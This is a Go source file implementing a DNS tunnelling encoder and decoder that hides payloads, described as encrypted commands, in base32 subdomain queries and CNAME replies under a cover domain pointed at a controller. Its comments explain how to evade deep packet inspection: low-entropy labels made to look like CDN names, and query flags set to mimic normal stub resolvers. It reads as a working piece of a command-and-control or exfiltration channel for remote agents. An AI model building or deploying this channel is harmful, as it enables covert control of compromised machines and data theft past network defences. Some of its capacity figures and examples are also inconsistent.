package dns

import (
	"encoding/base32"
	"fmt"
	"strings"

	"github.com/miekg/dns"
)

// =============================================================================
// DNS Obfuscator — payload ↔ DNS query / response
// =============================================================================
//
// Wire format (uplink — client → server):
//
//   DNS A-record query for:
//     <base32_payload>.<seq>.v<version>.<cover_domain>
//
//   Example:
//     ghr23sdf567hgf852xyz.a.v1.sync.example.com
//     ├── base32(encrypted cmd) ──┤│ │ │└ cover domain
//                                  │ │ └ version label
//                                  │ └ sequence byte
//
// Wire format (downlink — server → client):
//
//   DNS response containing CNAME:
//     <base32_payload>.<ack>.v<version>.<cover_domain>
//
// Design notes:
//   - base32 lowercase (a-z 2-7) avoids special characters
//     that would increase domain entropy and trigger DPI alerts.
//   - Version label allows protocol evolution without breaking
//     existing agents.
//   - Sequence/ACK bytes are single-character labels that provide
//     ordering for the reliability layer without extra fields.
//   - Max raw payload per query: ~148 bytes (after base32 expansion
//     into a 253-byte domain name).

const (
	// MaxRawPayload is the maximum number of raw (pre-encoding) bytes
	// that fit in a single DNS query domain after base32 expansion
	// and label splitting.
	//
	// Derivation:
	//   DNS max FQDN  = 253 bytes
	//   Cover domain   ≈  32 bytes (e.g. "a.v1.sync.example.com")
	//   Available       = 221 bytes
	//   Base32 overhead = 8/5 ≈ 1.6×
	//   Raw capacity    = 221 / 1.6 ≈ 138
	//   Rounded down    = 128 (safe margin)
	MaxRawPayload = 128

	// maxLabelLen is the RFC 1035 limit for a single DNS label.
	maxLabelLen = 63

	// maxDomainLen is the RFC 1035 limit for a complete FQDN.
	maxDomainLen = 253
)

// Base32 encoding — lowercase alphabet that looks like plausible
// CDN / cloud subdomain labels (no uppercase, no confusing 0/O/1/I/l).
var dnsBase32 = base32.NewEncoding("abcdefghijklmnopqrstuvwxyz234567").
	WithPadding(base32.NoPadding)

// DNSObfuscator wraps raw bytes into DNS messages and unwraps them.
//
// The obfuscator is transport-agnostic: it only knows how to build
// and parse DNS messages. The actual network I/O lives in DNSTransport.
type DNSObfuscator struct {
	// CoverDomain is the authoritative domain whose NS points to
	// the controller. All encoded queries live under this domain.
	//
	// Example: "sync.example.com"
	CoverDomain string

	// Version is a short protocol version tag embedded as a DNS
	// label. Different versions can coexist — the server inspects
	// the version label before decoding.
	//
	// Example: "v1"
	Version string
}

// NewDNSObfuscator creates a DNSObfuscator with the given cover
// domain and protocol version.
func NewDNSObfuscator(coverDomain, version string) *DNSObfuscator {
	return &DNSObfuscator{
		CoverDomain: strings.TrimSuffix(coverDomain, "."),
		Version:     version,
	}
}

// =============================================================================
// Encode — raw bytes → DNS query
// =============================================================================

// EncodeQuery builds a DNS A-record query carrying payload in the
// question name.
//
// The resulting query looks like a normal A-record lookup for a
// subdomain of the cover domain. seq is a single byte used for
// ordering; it is embedded as a single-character label.
func (o *DNSObfuscator) EncodeQuery(payload []byte, seq byte) (*dns.Msg, error) {
	if len(payload) > MaxRawPayload {
		return nil, fmt.Errorf("dns obfs: payload %d bytes exceeds max %d", len(payload), MaxRawPayload)
	}

	encoded := dnsBase32.EncodeToString(payload)
	fqdn := o.buildFQDN(encoded, seq)

	msg := new(dns.Msg)
	msg.SetQuestion(fqdn, dns.TypeA)
	msg.RecursionDesired = true
	// Don't set RD = false — that's unusual for stub resolvers
	// and would stand out. A normal client sets RD = true.

	// EDNS0: advertise a 4096-byte UDP payload (RFC 6891).
	// Modern stub resolvers always include an OPT pseudo-record;
	// omitting it makes the query stand out as pre-1999 traffic.
	msg.SetEdns0(4096, false)

	return msg, nil
}

// buildFQDN assembles the fully-qualified domain name:
//
//	<encoded>.<seq_label>.<version>.<cover_domain>
//
// Encoded labels are split at the 63-byte boundary per RFC 1035.
func (o *DNSObfuscator) buildFQDN(encoded string, seq byte) string {
	// Split the base32 string into 63-byte labels.
	labels := splitLabels(encoded, maxLabelLen)

	// Append sequence as its own label (single base32 character).
	seqStr := dnsBase32.EncodeToString([]byte{seq})
	labels = append(labels, seqStr)

	// Append version label.
	labels = append(labels, o.Version)

	// Append cover domain.
	fqdn := strings.Join(labels, ".") + "." + o.CoverDomain + "."

	return strings.ToLower(fqdn)
}

// =============================================================================
// Decode — DNS response → raw bytes
// =============================================================================

// DecodeResponse extracts the payload from a DNS response.
//
// The payload is read from the first CNAME record in the Answer
// section. The CNAME target's labels are merged, base32-decoded,
// and returned as raw bytes.
//
// Returns the payload and the sequence byte extracted from the
// CNAME target.
func (o *DNSObfuscator) DecodeResponse(msg *dns.Msg) (payload []byte, ack byte, err error) {
	// Walk the Answer section looking for a CNAME under our cover domain.
	for _, rr := range msg.Answer {
		cname, ok := rr.(*dns.CNAME)
		if !ok {
			continue
		}
		target := strings.TrimSuffix(cname.Target, ".")
		if !strings.HasSuffix(strings.ToLower(target), strings.ToLower(o.CoverDomain)) {
			continue
		}

		return o.extractFromTarget(target)
	}

	// Some resolvers put CNAME in the Authority section when the
	// answer is a referral. Check there too.
	for _, rr := range msg.Ns {
		cname, ok := rr.(*dns.CNAME)
		if !ok {
			continue
		}
		target := strings.TrimSuffix(cname.Target, ".")
		if !strings.HasSuffix(strings.ToLower(target), strings.ToLower(o.CoverDomain)) {
			continue
		}
		return o.extractFromTarget(target)
	}

	return nil, 0, fmt.Errorf("dns obfs: no CNAME under %s in response", o.CoverDomain)
}

// extractFromTarget pulls the base32 payload and sequence byte from
// a CNAME target like:
//
//	ghr23sdf567hgf852xyz.a.v1.sync.example.com
//	├── encoded payload ──┤│ │└ cover domain
//	                        │ └ version
//	                        └ ack byte
func (o *DNSObfuscator) extractFromTarget(target string) ([]byte, byte, error) {
	// Strip cover domain suffix.
	target = strings.TrimSuffix(strings.ToLower(target), "."+strings.ToLower(o.CoverDomain))
	target = strings.TrimSuffix(target, ".")

	labels := strings.Split(target, ".")

	// We need at least 3 labels: <encoded...>, <ack>, <version>
	if len(labels) < 3 {
		return nil, 0, fmt.Errorf("dns obfs: unexpected CNAME structure: %s", target)
	}

	// Last label is version, second-to-last is ack, rest is payload.
	versionLabel := labels[len(labels)-1]
	ackLabel := labels[len(labels)-2]
	encodedLabels := labels[:len(labels)-2]

	// Validate version.
	if versionLabel != o.Version {
		return nil, 0, fmt.Errorf("dns obfs: version mismatch (got %q, want %q)", versionLabel, o.Version)
	}

	// Decode ack byte.
	ackBytes, err := dnsBase32.DecodeString(ackLabel)
	if err != nil || len(ackBytes) == 0 {
		return nil, 0, fmt.Errorf("dns obfs: invalid ack label %q: %w", ackLabel, err)
	}

	// Merge and decode payload labels.
	encoded := strings.Join(encodedLabels, "")
	payload, err := dnsBase32.DecodeString(encoded)
	if err != nil {
		return nil, 0, fmt.Errorf("dns obfs: base32 decode failed: %w", err)
	}

	return payload, ackBytes[0], nil
}

// =============================================================================
// Helpers
// =============================================================================

// splitLabels splits s into chunks of at most maxLen bytes each.
func splitLabels(s string, maxLen int) []string {
	if len(s) <= maxLen {
		return []string{s}
	}

	var labels []string
	for i := 0; i < len(s); i += maxLen {
		end := i + maxLen
		if end > len(s) {
			end = len(s)
		}
		labels = append(labels, s[i:end])
	}
	return labels
}
